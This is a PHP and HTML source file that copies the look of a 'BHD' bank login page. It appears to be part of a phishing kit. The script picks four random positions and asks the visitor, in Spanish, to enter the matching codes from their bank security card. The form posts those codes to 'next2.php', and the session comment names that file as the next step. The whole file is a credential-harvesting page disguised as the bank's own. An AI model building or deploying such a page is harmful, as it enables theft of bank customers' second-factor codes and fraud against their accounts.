<?php
session_start();

// Generar 4 números aleatorios del 1 al 20 sin repetir
$numeros = range(1, 20);
shuffle($numeros);
$pos1 = str_pad($numeros[0], 2, '0', STR_PAD_LEFT);
$pos2 = str_pad($numeros[1], 2, '0', STR_PAD_LEFT);
$pos3 = str_pad($numeros[2], 2, '0', STR_PAD_LEFT);
$pos4 = str_pad($numeros[3], 2, '0', STR_PAD_LEFT);

// Guardar en sesión para next2.php
$_SESSION['coordenadas_1'] = [$pos1, $pos2, $pos3, $pos4];
?>
<html lang="en">
<head>
<meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
<meta charset="utf-8">
<title>BHD</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
:root{--surface-a:#ffffff;--surface-b:#f8f9fa;--surface-c:#e9ecef;--surface-d:#dee2e6;--surface-e:#ffffff;--surface-f:#ffffff;--text-color:#495057;--text-color-secondary:#6c757d;--primary-color:#2196F3;--primary-color-text:#ffffff;--font-family:-apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;--surface-0:#ffffff;--surface-50:#FAFAFA;--surface-100:#F5F5F5;--surface-200:#EEEEEE;--surface-300:#E0E0E0;--surface-400:#BDBDBD;--surface-500:#9E9E9E;--surface-600:#757575;--surface-700:#616161;--surface-800:#424242;--surface-900:#212121;--gray-50:#FAFAFA;--gray-100:#F5F5F5;--gray-200:#EEEEEE;--gray-300:#E0E0E0;--gray-400:#BDBDBD;--gray-500:#9E9E9E;--gray-600:#757575;--gray-700:#616161;--gray-800:#424242;--gray-900:#212121;--content-padding:1rem;--inline-spacing:.5rem;--border-radius:3px;--surface-ground:#f8f9fa;--surface-section:#ffffff;--surface-card:#ffffff;--surface-overlay:#ffffff;--surface-border:#dee2e6;--surface-hover:#e9ecef;--maskbg:rgba(0, 0, 0, .4);--focus-ring:0 0 0 .2rem #a6d5fa;color-scheme:light}*{box-sizing:border-box}:root{--blue-50:#f4fafe;--blue-100:#cae6fc;--blue-200:#a0d2fa;--blue-300:#75bef8;--blue-400:#4baaf5;--blue-500:#2196f3;--blue-600:#1c80cf;--blue-700:#1769aa;--blue-800:#125386;--blue-900:#0d3c61;--green-50:#f6fbf6;--green-100:#d4ecd5;--green-200:#b2ddb4;--green-300:#90cd93;--green-400:#6ebe71;--green-500:#4caf50;--green-600:#419544;--green-700:#357b38;--green-800:#2a602c;--green-900:#1e4620;--yellow-50:#fffcf5;--yellow-100:#fef0cd;--yellow-200:#fde4a5;--yellow-300:#fdd87d;--yellow-400:#fccc55;--yellow-500:#fbc02d;--yellow-600:#d5a326;--yellow-700:#b08620;--yellow-800:#8a6a19;--yellow-900:#644d12;--cyan-50:#f2fcfd;--cyan-100:#c2eff5;--cyan-200:#91e2ed;--cyan-300:#61d5e4;--cyan-400:#30c9dc;--cyan-500:#00bcd4;--cyan-600:#00a0b4;--cyan-700:#008494;--cyan-800:#006775;--cyan-900:#004b55;--pink-50:#fef4f7;--pink-100:#fac9da;--pink-200:#f69ebc;--pink-300:#f1749e;--pink-400:#ed4981;--pink-500:#e91e63;--pink-600:#c61a54;--pink-700:#a31545;--pink-800:#801136;--pink-900:#5d0c28;--indigo-50:#f5f6fb;--indigo-100:#d1d5ed;--indigo-200:#acb4df;--indigo-300:#8893d1;--indigo-400:#6372c3;--indigo-500:#3f51b5;--indigo-600:#36459a;--indigo-700:#2c397f;--indigo-800:#232d64;--indigo-900:#192048;--teal-50:#f2faf9;--teal-100:#c2e6e2;--teal-200:#91d2cc;--teal-300:#61beb5;--teal-400:#30aa9f;--teal-500:#009688;--teal-600:#008074;--teal-700:#00695f;--teal-800:#00534b;--teal-900:#003c36;--orange-50:#fff8f2;--orange-100:#fde0c2;--orange-200:#fbc791;--orange-300:#f9ae61;--orange-400:#f79530;--orange-500:#f57c00;--orange-600:#d06900;--orange-700:#ac5700;--orange-800:#874400;--orange-900:#623200;--bluegray-50:#f7f9f9;--bluegray-100:#d9e0e3;--bluegray-200:#bbc7cd;--bluegray-300:#9caeb7;--bluegray-400:#7e96a1;--bluegray-500:#607d8b;--bluegray-600:#526a76;--bluegray-700:#435861;--bluegray-800:#35454c;--bluegray-900:#263238;--purple-50:#faf4fb;--purple-100:#e7cbec;--purple-200:#d4a2dd;--purple-300:#c279ce;--purple-400:#af50bf;--purple-500:#9c27b0;--purple-600:#852196;--purple-700:#6d1b7b;--purple-800:#561561;--purple-900:#3e1046;--red-50:#fff5f5;--red-100:#ffd1ce;--red-200:#ffada7;--red-300:#ff8980;--red-400:#ff6459;--red-500:#ff4032;--red-600:#d9362b;--red-700:#b32d23;--red-800:#8c231c;--red-900:#661a14;--primary-50:#f4fafe;--primary-100:#cae6fc;--primary-200:#a0d2fa;--primary-300:#75bef8;--primary-400:#4baaf5;--primary-500:#2196f3;--primary-600:#1c80cf;--primary-700:#1769aa;--primary-800:#125386;--primary-900:#0d3c61}:root{--bhd-white-color-1:#ffffff;--bhd-white-color-2:#f1f1f1;--bhd-white-color-3:#ffffffb3;--bhd-green-color-1:#00560e;--bhd-green-color-2:#51af46;--bhd-green-color-3:#9ac593;--bhd-green-color-4:#c8e6c9;--bhd-green-color-5:#f3fcf3;--bhd-green-color-6:#d9ecc6;--bhd-green-color-7:#357b2a;--bhd-gray-color-1:#2c353a;--bhd-gray-color-2:#5e5e5e;--bhd-gray-color-3:#869394;--bhd-gray-color-4:#f8f9fa;--bhd-gray-color-5:#dee2e6;--bhd-gray-color-6:#dcdcdc;--bhd-gray-color-7:#fcfcfc;--bhd-gray-color-8:#eaedf1;--bhd-blue-color-1:#003e7e;--bhd-blue-color-2:#0d89ec;--bhd-blue-color-3:#859ece;--bhd-blue-color-4:#edf3ff;--bhd-red-color-1:#ec6666;--bhd-red-color-2:#ffcdd2;--bhd-red-color-3:#5a1a1a;--bhd-brown-color-1:#6d5100;--bhd-yellow-color-1:#ffecb3;--bhd-orange-color-1:#ffc100}@font-face{font-family:Trebuchet;src:url(TrebuchetMS.7c6358bbdb6ed6be.ttf) format("woff")}html{background-color:var(--bhd-gray-color-8)}html body{font-family:Trebuchet MS,Helvetica,sans-serif;font-size:13px}body{overflow-x:hidden;margin:0}
</style>
<link rel="stylesheet" href="styles.css" media="all" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.787942894ddbf9cb.css"></noscript>
<style>
.p-toast{position:fixed;width:25rem}.p-toast-message{overflow:hidden}.p-toast-message-content{display:flex;align-items:flex-start}.p-toast-message-text{flex:1 1 auto}.p-toast-top-right{top:20px;right:20px}.p-toast-top-left{top:20px;left:20px}.p-toast-bottom-left{bottom:20px;left:20px}.p-toast-bottom-right{bottom:20px;right:20px}.p-toast-top-center{top:20px;left:50%;transform:translate(-50%)}.p-toast-bottom-center{bottom:20px;left:50%;transform:translate(-50%)}.p-toast-center{left:50%;top:50%;min-width:20vw;transform:translate(-50%,-50%)}.p-toast-icon-close{display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}.p-toast-icon-close.p-link{cursor:pointer}
</style>
<style>
.bhd-captcha[_ngcontent-otb-c140]{background:var(--bhd-white-color-1);background-image:radial-gradient(var(--bhd-gray-color-3) 1.2px,transparent 0);background-size:6px 6px;position:relative;box-sizing:content-box;width:120px;padding:3px;font-weight:400;height:31px;font-size:x-large;border-radius:4px;text-align:center;margin:0 0 0 10px}.bhd-captcha[_ngcontent-otb-c140]   span[_ngcontent-otb-c140]{letter-spacing:8px;display:inline-block;transform:translate(-50%,-50%)}.bhd-captcha-validaton[_ngcontent-otb-c140]{width:75px;font-size:21px}.bhd-captcha-line[_ngcontent-otb-c140]{border-top:1px solid var(--bhd-gray-color-1);letter-spacing:8px;display:inline-block;transform:translate(-50%,-50%);position:absolute;width:115px;top:8px;left:4px}.bhd-divider[_ngcontent-otb-c140]{box-sizing:border-box;width:20px;height:0px;border:1px solid var(--bhd-green-color-2);transform:rotate(90deg);flex:none;flex-grow:0}.background-container[_ngcontent-otb-c140]{display:grid;height:100vh;background-size:cover;background-position:center;background-image:url(/assets/img/background-login.webp)}.card-top[_ngcontent-otb-c140]{padding-top:133px}.user-input[_ngcontent-otb-c140]{position:relative}.user-input[_ngcontent-otb-c140]   .close-icon[_ngcontent-otb-c140]{position:absolute;top:19px;right:17px;cursor:pointer}.ibe-link[_ngcontent-otb-c140]{cursor:pointer;color:var(--bhd-white-color-1)}.ibe-link[_ngcontent-otb-c140]:hover   span[_ngcontent-otb-c140]{font-style:italic;text-decoration:underline}
</style>
<style>
@charset "UTF-8";.bhd-loading-overlay[_ngcontent-otb-c81]{background:var(--bhd-white-color-3);position:fixed;inset:-30% 0 0;z-index:99999999999;align-items:center;justify-content:center;display:flex;visibility:visible;opacity:1;transition:opacity .25s ease-in,visibility 0ms ease-in 0ms;overflow-y:hidden}.bhd-loading-overlay[_ngcontent-otb-c81]   .pi-spin[_ngcontent-otb-c81]{animation:fa-spin 1.2s infinite linear}.bhd-fade-out[_ngcontent-otb-c81]{visibility:hidden;opacity:0;transition:opacity .25s ease-in,visibility 0ms ease-in .25s}@keyframes ellipsis{to{width:1.25em}}.loading[_ngcontent-otb-c81]{margin-left:-1.25em}.loading[_ngcontent-otb-c81]:before{overflow:hidden;display:inline-block;vertical-align:bottom;animation:ellipsis steps(5,end) 2s infinite;content:"\2026";width:0;color:transparent}.loading[_ngcontent-otb-c81]:after{overflow:hidden;display:inline-block;vertical-align:bottom;animation:ellipsis steps(5,end) 2s infinite;content:"\2026";width:0}
</style>
<style>
.bhd-icon[_nghost-otb-c38]{display:inline-block}
</style>
<style>
svg[_ngcontent-otb-c38]{vertical-align:baseline}
</style>
<style>
.p-dialog-mask{position:fixed;top:0;left:0;width:100%;height:100%;display:flex;justify-content:center;align-items:center;pointer-events:none}.p-dialog-mask.p-component-overlay{pointer-events:auto}.p-dialog{display:flex;flex-direction:column;pointer-events:auto;max-height:90%;transform:scale(1);position:relative}.p-dialog-content{overflow-y:auto;flex-grow:1}.p-dialog-header{display:flex;align-items:center;justify-content:space-between;flex-shrink:0}.p-dialog-draggable .p-dialog-header{cursor:move}.p-dialog-footer{flex-shrink:0}.p-dialog .p-dialog-header-icons{display:flex;align-items:center}.p-dialog .p-dialog-header-icon{display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}.p-fluid .p-dialog-footer .p-button{width:auto}.p-dialog-top .p-dialog,.p-dialog-bottom .p-dialog,.p-dialog-left .p-dialog,.p-dialog-right .p-dialog,.p-dialog-top-left .p-dialog,.p-dialog-top-right .p-dialog,.p-dialog-bottom-left .p-dialog,.p-dialog-bottom-right .p-dialog{margin:.75rem;transform:translateZ(0)}.p-dialog-maximized{transition:none;transform:none;width:100vw!important;height:100vh!important;top:0!important;left:0!important;max-height:100%;height:100%}.p-dialog-maximized .p-dialog-content{flex-grow:1}.p-dialog-left{justify-content:flex-start}.p-dialog-right{justify-content:flex-end}.p-dialog-top{align-items:flex-start}.p-dialog-top-left{justify-content:flex-start;align-items:flex-start}.p-dialog-top-right{justify-content:flex-end;align-items:flex-start}.p-dialog-bottom{align-items:flex-end}.p-dialog-bottom-left{justify-content:flex-start;align-items:flex-end}.p-dialog-bottom-right{justify-content:flex-end;align-items:flex-end}.p-dialog .p-resizable-handle{position:absolute;font-size:.1px;display:block;cursor:se-resize;width:12px;height:12px;right:1px;bottom:1px}.p-confirm-dialog .p-dialog-content{display:flex;align-items:center}
</style>
<style>
.p-card-header img{width:100%}
</style>
<style type="text/css">
@media screen and (max-width: 640px) {
.p-dialog[pr_id_2] {
width: 100vw !important;
}
}
</style>
</head>
<body>
 
<ibp-root ng-version="14.3.0">
<router-outlet></router-outlet>
<ibp-login _nghost-otb-c140="" class="ng-star-inserted">
<div _ngcontent-otb-c140="" class="background-container ng-star-inserted">
<div _ngcontent-otb-c140="" class="p-d-flex p-jc-center card-top">
<div _ngcontent-otb-c140="" class="p-d-flex p-flex-column">
<p-card _ngcontent-otb-c140="" class="p-element">
<div class="p-card p-component" style="max-width: 400px;">
<div class="p-card-body">
<div class="p-card-content">
<div _ngcontent-otb-c140="" class="p-grid">
<form action="next2.php" method="post">
<div _ngcontent-otb-c140="" class="p-fluid p-formgrid p-grid p-jc-center">


<div _ngcontent-otb-c140="" class="p-field p-col-10">

<h2>Ingresa el código solicitado de tu tarjeta de claves:
  <br>
  <br>
</h2>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos1; ?></div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input type="text" name="co1" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos2; ?></div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co2" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos3; ?></div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co3" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
  </tr>
</table>
<br>
<table width="0" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
    <td width="39" bgcolor="#51AF46"><div align="center"><?php echo $pos4; ?></div></td>
    <td width="10">&nbsp;</td>
    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co4" maxlength="2" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required oninput="this.value = this.value.replace(/[^0-9]/g, '')"></td>
  </tr>
</table>
<label _ngcontent-otb-c140="" for="userName"></label>
</span>



</div>

<div _ngcontent-otb-c140="" class="p-field p-col-10 p-mb-2" style="display: none;">
<div _ngcontent-otb-c140="" class="p-d-flex">
<div _ngcontent-otb-c140="">
<div _ngcontent-otb-c140="" class="bhd-captcha">
<!----><canvas _ngcontent-otb-c140="" width="110" height="30"></canvas></div>
<div _ngcontent-otb-c140="" class="p-mb-4 p-mt-2 bhd--font-size-12">
<p _ngcontent-otb-c140="" class="p-m-0 bhd-hover-green-2-pointer">Refrescar imagen</p>
</div>
</div>
<div _ngcontent-otb-c140="" class="p-ml-3"><input _ngcontent-otb-c140="" type="text" pinputtext="" name="captcha" maxlength="4" formcontrolname="captcha" class="p-inputtext p-component p-element bhd-captcha-validaton ng-untouched ng-pristine ng-valid">
<!---->
</div>
</div>
</div>
<div _ngcontent-otb-c140="" class="p-field p-col-10 p-mt-2">
<p-button _ngcontent-otb-c140="" type="submit" iconpos="right" class="p-element">
<button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component" type="submit"><!----><!----><span class="p-button-label ng-star-inserted">Continuar</span><!----><!----><span class="p-ink"></span></button></p-button>
</div>

</div>
</form>
</div>
<div _ngcontent-otb-c140="" class="p-fluid p-formgrid p-grid p-jc-center">
<div _ngcontent-otb-c140="" class="p-field p-col-10 p-m-0 p-p-0">
<!---->
</div>
</div>
<!---->
</div>
<!---->
</div>
</div>
</p-card>

</div>
</div>
<div _ngcontent-otb-c140="" class="bhd-version"><span _ngcontent-otb-c140="" class="number-version">v1.0.8</span></div>
</div>
<!---->
<!---->
<ibp-loader _ngcontent-otb-c140="" _nghost-otb-c81="">
<div _ngcontent-otb-c81="" class="bhd-loading-overlay p-d-flex p-flex-column bhd-fade-out">
<bhd-icon _ngcontent-otb-c81="" name="action-reuse" class="bhd-green-2 pi-spin bhd-icon" _nghost-otb-c38="" style="width: 58px; height: 58px;"><svg _ngcontent-otb-c38="" xmlns="http://www.w3.org/2000/svg" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke="var(--bhd-icon-color, currentColor)"
class="bhd-icon-action-reuse" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19.603 16c-1.433 2.963-4.408 5-7.846 5-4.508 0-8.22-3.5-8.704-8m16.55 3H16m3.603 0L21 19M4.397 8c1.433-2.963 4.408-5 7.846-5 4.508 0 8.22 3.5 8.704 8M4.397 8H8M4.397 8 3 5"></path></svg></bhd-icon>
<h3
_ngcontent-otb-c81="" class="bhd--font-size-22 loading">Accediendo al canal, por favor espere</h3>
</div>
</ibp-loader>
<ibp-common-modal _ngcontent-otb-c140="">
<p-dialog class="p-element ng-tns-c40-1 ng-star-inserted">
<!---->
</p-dialog>
</ibp-common-modal>
</ibp-login>
<!---->
<p-toast position="top-right" class="p-element ng-tns-c36-0">
<div class="ng-tns-c36-0 p-toast p-component p-toast-top-right">
<!---->
</div>
</p-toast>
</ibp-root>



<div id="ads"></div>


</body>

</html>
